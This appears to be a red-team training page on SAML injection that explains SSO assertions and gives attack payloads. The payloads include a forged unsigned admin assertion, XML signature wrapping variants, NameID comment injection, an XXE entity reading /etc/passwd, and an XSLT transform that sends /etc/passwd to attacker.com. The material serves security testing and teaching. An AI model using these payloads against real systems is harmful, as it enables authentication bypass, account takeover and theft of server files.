---
layout: training-page
title: "SAML Injection — Red Team Academy"
module: "Web Hacking"
tags:
  - saml
  - sso
  - xml-signature-wrapping
  - authentication-bypass
  - xxe
page_key: "web-saml-injection"
render_with_liquid: false
---

# SAML Injection

SAML (Security Assertion Markup Language) is the protocol behind many Single Sign-On (SSO)
  implementations. A SAML assertion is an XML document asserting a user's identity, signed by
  an Identity Provider (IdP) and consumed by a Service Provider (SP). Vulnerabilities arise from
  improper signature verification, XML parsing quirks, and missing validation — allowing attackers
  to forge assertions, authenticate as arbitrary users, or extract server-side files.

## Tools

- SAMLRaider — Burp Suite extension for SAML testing — `github.com/SAMLRaider/SAMLRaider`
- d0ge/XSW — XML Signature Wrapping Burp extension — `github.com/d0ge/XSW`
- ZAP SAML Support addon — detect, edit, fuzz SAML requests

## SAML Response Structure

```
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Issuer>https://idp.example.com</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>user@example.com</saml:NameID>
    </saml:Subject>
    <ds:Signature>...</ds:Signature>
  </saml:Assertion>
</samlp:Response>
```

## Attack Techniques

### Invalid Signature (Certificate Cloning)

If the SP validates the signature but does not verify the certificate chain (e.g., accepts
  self-signed certificates), an attacker can clone the certificate or create their own self-signed
  cert to sign a forged assertion. Steps:

1. Capture a real SAML response and extract the certificate
2. Generate a new self-signed certificate with the same subject details
3. Forge an assertion with `NameID=admin` and sign it with the new certificate
4. Submit the forged assertion

### Signature Stripping

In some default configurations, if the `<ds:Signature>` block is entirely
  omitted from the SAML response, the SP skips signature verification. The SP accepts any unsigned
  assertion — effectively accepting a username without checking the password.

```
<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
  Destination="http://sp.example.com/acs" ID="id1234" Version="2.0">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">REDACTED</saml2:Issuer>
  <saml2p:Status>
    <saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </saml2p:Status>
  <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" ID="id5678" Version="2.0">
    <saml2:Subject>
      <saml2:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified">admin</saml2:NameID>
      <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml2:SubjectConfirmationData NotOnOrAfter="2099-01-01T00:00:00.000Z"
          Recipient="http://sp.example.com/acs"/>
      </saml2:SubjectConfirmation>
    </saml2:Subject>
    <!-- Signature block intentionally omitted -->
  </saml2:Assertion>
</saml2p:Response>
```

### XML Signature Wrapping (XSW) Attacks

XSW attacks exploit the mismatch between which XML element is validated (signed) and which
  element is actually processed by the application. The SP verifies the signature over the
  Legitimate Assertion (LA) but processes the Forged Assertion (FA) because of ambiguous
  element selection logic.

```
<SAMLResponse>
  <!-- FA: Forged Assertion (unsigned, processed by vulnerable SP) -->
  <Assertion ID="evil">
    <Subject>admin</Subject>
  </Assertion>

  <!-- LA: Legitimate Assertion with valid signature -->
  <Assertion ID="legitimate">
    <Subject>normaluser</Subject>
    <Signature>
      <Reference URI="legitimate"/>  <!-- signs the legitimate assertion -->
    </Signature>
  </Assertion>
</SAMLResponse>
```

The 8 XSW variants (automate with SAMLRaider):

- **XSW1** — add cloned unsigned Response copy after the existing signature
- **XSW2** — add cloned unsigned Response copy before the existing signature
- **XSW3** — add cloned unsigned Assertion before the existing Assertion
- **XSW4** — add cloned unsigned Assertion inside the existing Assertion
- **XSW5** — change signed Assertion value; append original with signature removed at end
- **XSW6** — change signed Assertion value; append original with signature removed after original signature
- **XSW7** — add an Extensions block with a cloned unsigned Assertion
- **XSW8** — add an Object block containing a copy of the original Assertion without its signature

### XML Comment Injection

Some SAML libraries parse the `NameID` value differently when XML comments are
  present. Injecting a comment inside the username can cause the application to authenticate as
  a different user while the signature remains valid over the full NameID string.

```
<NameID>user@legitimate.com<!--XMLCOMMENT-->.evil.com</NameID>
<!-- Application sees: user@legitimate.com (comment stripped during processing) -->
<!-- But signature was over: user@legitimate.com<!--XMLCOMMENT-->.evil.com -->
```

Affected libraries (CVEs):

- OneLogin python-saml — CVE-2017-11427
- OneLogin ruby-saml — CVE-2017-11428
- Clever saml2-js — CVE-2017-11429
- OmniAuth-SAML — CVE-2017-11430
- Shibboleth — CVE-2018-0489
- Duo Network Gateway — CVE-2018-7340

### XML External Entity (XXE) in SAML

If the SP's XML parser processes external entities, the SAML response can be weaponized to
  read server-side files or trigger SSRF. The entity is defined in a DOCTYPE declaration and
  referenced in an attribute value — the signature remains valid because the content does not
  change until the entity is resolved during parsing.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE Response [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<saml2p:Response ...>
  ...
  <saml2:AttributeValue>&xxe;</saml2:AttributeValue>
  ...
</saml2p:Response>
```

### XSLT Injection via Transform Element

Some SAML implementations allow XSLT transforms inside the `ds:Signature` block.
  A malicious transform can read local files and exfiltrate them to the attacker.

```
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
  <ds:SignedInfo>
    <ds:Transforms>
      <ds:Transform>
        <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
          <xsl:template match="doc">
            <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
            <xsl:variable name="escaped" select="encode-for-uri($file)"/>
            <xsl:variable name="url" select="concat('http://attacker.com/', $escaped)"/>
            <xsl:value-of select="unparsed-text($url)"/>
          </xsl:template>
        </xsl:stylesheet>
      </ds:Transform>
    </ds:Transforms>
  </ds:SignedInfo>
</ds:Signature>
```

## Testing Checklist

- Capture a valid SAML response in Burp and base64-decode the SAMLResponse parameter
- Modify the NameID to a target username and re-submit (tests missing signature verification)
- Remove the entire Signature block and re-submit (tests signature stripping)
- Run all 8 XSW variants with SAMLRaider
- Inject an XML comment inside the NameID value
- Add a DOCTYPE with file-reading XXE entities
- Check if the NotOnOrAfter condition is validated (try setting it far in the future)

## Resources

- PayloadsAllTheThings SAML Injection — `github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SAML%20Injection`
- SAMLRaider Burp Extension — `github.com/SAMLRaider/SAMLRaider`
- On Breaking SAML: Be Whoever You Want to Be — Juraj Somorovsky et al., USENIX Security 2012
- The road to your codebase is paved with forged assertions — Ioannis Kakavas (GitHub Enterprise SAML bug)
- OWASP SAML Security Cheat Sheet — `github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/SAML_Security_Cheat_Sheet.md`
- How to Hunt Bugs in SAML (3-part series) — Ben Risher (@epi052)
